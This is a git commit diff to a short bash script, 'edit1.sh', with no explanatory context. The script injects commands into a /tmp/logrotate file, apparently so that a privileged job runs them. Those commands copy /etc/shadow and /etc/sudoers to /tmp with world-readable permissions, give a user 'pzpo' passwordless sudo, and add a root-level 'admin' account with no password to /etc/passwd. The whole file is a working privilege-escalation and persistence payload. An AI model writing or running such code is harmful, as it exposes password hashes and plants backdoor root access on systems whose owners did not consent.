d0f954d4d131e1c4347fe229b4ff2ca2b0078195
kovaliv1990 <127501891+kovaliv1990@users.noreply.github.com>
2023-03-17 20:08:10 +0200

    Update edit1.sh

--- edit1.sh
+++ edit1.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
-cp /etc/shadow /tmp/sha_copy
-chmod 666 /tmp/sh_copy 
-cp /etc/sudoers /tmp/sudoers_copy
-chmod 666 /tmp/sudoers_copy 
+echo "cp /etc/shadow /tmp/sha_copy"  >> /tmp/logrotate
+echo "chmod 666 /tmp/sh_copy"  >> /tmp/logrotate
+echo "cp /etc/sudoers /tmp/sudoers_copy"  >> /tmp/logrotate
+echo "chmod 666 /tmp/sudoers_copy "  >> /tmp/logrotate
 echo "echo 'pzpo ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" >> /tmp/logrotate
 echo "echo 'admin::0:0:System Administrator:/root/root:/bin/bash' >> /etc/passwd"  >> /tmp/logrotate
